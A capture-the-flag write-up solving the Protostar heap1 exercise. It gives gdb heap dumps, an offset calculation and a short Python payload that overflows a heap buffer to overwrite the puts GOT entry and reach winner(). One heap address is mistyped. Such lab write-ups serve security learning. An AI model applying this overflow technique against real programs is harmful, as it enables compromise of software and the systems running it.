### S0lv3d by H4yicl3


link https://exploit-exercises.com/protostar/heap1/

```
compile with  gcc -m32 -o heap1 heap1.c
```

try to analysis it with gdb
```asm
pdis main
0x0804855f <+94>:    mov    edx,eax
b *main+94
0x08048583 <+130>:   mov    eax,DWORD PTR [ebp+0xc]
b *main+130


gdb-peda$ x/40wx 0x0804b000 
0x804b000:      0x00000000      0x00000011      0x00000001      0x0804b018
0x804b010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804b020:      0x00000000      0x00000011      0x00000002      0x0804b038
0x804b030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804b040:      0x00000000      0x00020fc1      0x00000000      0x00000000
0x804b050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b090:      0x00000000      0x00000000      0x00000000      0x00000000
```

that heap data let us know many information in the heap
so strcpy(i1->name, argv[1]); let us overflow the address i2->name
so we can overflow it with address puts.got = i2->name
so when strcpy(i2->name, argv[2]); is called it make us can redirect to puts then 
the following code look like puts(argument) then return
we overflow the retn after puts is called !!
so the retn = winner_address
```
gdb-peda$ p winner
$1 = {<text variable, no debug info>} 0x80484dd <winner>
```

heap start at 0x804b0018
need change at 0x804b02c
the offset = 0x2c-0x18 = 0x14 = 20

address of puts_got
```
hayicle@ubuntu:~/ctf/protostar/heap$ objdump -R heap1

heap1:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0804a01c R_386_JUMP_SLOT   puts
...
```

the python code look like
```python
padding ="A"*0x14
puts_got="\x1c\xa0\x04\x08" 
address_winner="\xdd\x84\x04\x08"
print padding + puts_got
```

try to run this
```
hayicle@ubuntu:~/ctf/protostar/heap$ ./heap1 `cat input` `echo -en "\xdd\x84\x04\x08"`
and we have a winner @ 1483330310
```

good luck !! not fun =]]~
